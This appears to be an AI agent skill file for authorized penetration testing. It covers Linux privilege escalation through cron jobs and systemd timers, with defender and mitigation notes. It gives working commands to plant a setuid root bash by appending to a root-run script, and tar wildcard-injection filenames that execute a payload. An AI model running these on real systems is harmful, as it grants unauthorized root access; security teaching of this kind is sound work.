---
name: cron-abuse
description: Use when you have a Linux shell on an authorized engagement
  and need to check scheduled tasks for privilege escalation. Covers cron
  file and directory enumeration, writable script and path hijacking,
  wildcard injection in cron commands, and systemd timer equivalents. Use
  when SUID and sudo paths failed, when LinPEAS flags cron jobs, or when
  root runs scripts you can influence.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
parent: privesc-linux
requires: [privesc-linux]
extends: []
relates: [linux-hardening]
tools:
  - name: Python
    version: 3.12
---

Cron jobs run as their owner on a schedule, so a root cron job that
executes a file you can write is a delayed root shell. This skill covers
cron enumeration and abuse on authorized engagements: finding every
scheduled task, spotting writable scripts and PATH weaknesses, wildcard
injection, and the systemd timer equivalent. Cron paths are quiet and
reliable, which makes them a favorite; check them before kernel exploits.

## Quick Workflow

1. List every cron source: system crontab, cron directories, user
   crontabs, and systemd timers.
2. For each job running as root, trace the full execution chain.
3. Flag writable scripts, writable directories in the chain, and PATH
   weaknesses.
4. Check wildcard usage in cron commands for injection.
5. Exploit the weakest chain with a payload that proves privilege.
6. Clean up the payload after confirmation.

## 1. Enumeration

```bash
# System crontab and drop-in directories
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null

# User crontabs (root's needs root, but check yours and others')
crontab -l 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Systemd timers: the modern cron
systemctl list-timers --all 2>/dev/null | head -20
ls -la /etc/systemd/system/*.timer 2>/dev/null

# For each job, list the script and its permissions
ls -la /opt/cleanup.sh 2>/dev/null
```

Read the actual script content, not just the cron line. The cron line
says what runs; the script says what it does, which commands it calls,
and what you can influence.

## 2. Writable chain exploitation

```bash
# Writable script run by root: append a proof payload
ls -la /usr/local/bin/backup.sh
# -rwxrwxr-x ... owned by root but group-writable by your group
echo 'chmod +s /bin/bash 2>/dev/null; id > /tmp/cronproof.txt' >> /usr/local/bin/backup.sh
# Wait for the schedule, then check
cat /tmp/cronproof.txt 2>/dev/null

# Safer proof that avoids persistent changes: copy a shell
# (choose the payload the engagement approves)

# PATH hijack: cron script calls 'tar' without a path and cron's PATH
# is controllable or the directory is writable
grep -E '^[A-Z_]+=.*PATH' /etc/crontab
head -20 /usr/local/bin/backup.sh | grep -E '^[a-z]+ '
```

Always prefer the least invasive proof the engagement allows. A file
write proving root execution is enough; leave the system as you found it
by restoring the script afterward.

## 3. Wildcard injection

```bash
# Classic: root cron runs 'tar cf /backup.tar /var/data/*'
# Create files whose names are tar options:
cd /var/data
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh /tmp/payload.sh'
# At the next run, tar executes your payload as root

# Check for the pattern in cron scripts
grep -rn '\*' /etc/cron.d/ /usr/local/bin/*.sh 2>/dev/null | grep -E 'tar|rsync|zip' | head -10
```

Wildcard injection works because the shell expands `*` before tar sees
it, turning filenames into options. The fix is `--` or absolute paths in
the cron command, but plenty of scripts still get this wrong.

## Edge cases

- The cron schedule is unclear. Check timestamps: `ls -la` on outputs,
  or watch with a marker file to learn the interval before planting a
  payload.
- The script is writable but runs as a non-root user. Still useful:
  lateral movement to that user may unlock their own cron or files.
- Systemd timers replace cron. Read the `.service` file the timer
  triggers; the same writable-chain analysis applies.
- Your payload never fires. Verify the job actually runs (system logs,
  timer status) before assuming the technique failed.

## Escalation

- No cron path exists: move to kernel-exploits as the last resort, or
  report the privesc as not achieved with the enumeration evidence.
- The writable script is huge and complex: trace only the commands that
  run as root; a single writable sourced file anywhere in the chain is
  enough.
- Cleanup matters: remove payloads, restore modified scripts from your
  backup copies, and verify restoration.

## Detection and defender view

Defenders see cron abuse as root processes with unexpected children,
new files in cron directories (FIM alerts), and modified scripts
(checksum changes). Systemd timer changes also log. Defenses are root
owned, non-writable scripts and directories in every scheduled chain,
absolute paths and `--` in cron commands, no wildcards with archivers,
and file integrity monitoring on cron locations.

## Key references

- MITRE ATT&CK T1053.003 (Scheduled Task/Job: Cron).
- MITRE ATT&CK T1053.006 (Scheduled Task/Job: Systemd Timers).
- CWE-732 (Incorrect Permission Assignment for Critical Resource).
- CWE-426 (Untrusted Search Path).
